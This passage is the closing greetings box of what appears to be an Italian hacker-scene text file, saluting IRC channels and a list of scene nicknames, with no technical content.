| vogliono  bene,  a  tutti gli  amici  di  #matrix.gov, #TNT,  #mojodo  ,  #HX ,    |
| #hackmaniaci, #isoladeipirati. Infine un grande saluto a  Mr.Wolf , LordMark  ,    |
| kodeR , FRANZ ,  ZeroHack , XaNnThIc', Tritemius  , SonGoten , Valnir,  bartx ,    |
| [JARRET] , Raptor_ ,  Theli (il cracker olandese)  XP Terminator , [^SPAWN^]  ,    |
| ADvAnCeD`, ]{SToRm}[  , qUiCkShOrT  , [NetDigger]  , LordMirror  Valk',  , Dark    |
| -Angel , [Elektro], n0x e a tutti gli amici della TNT crew e di OQ !               |
+------------------------------------------------------------------------------------+
```

</div>
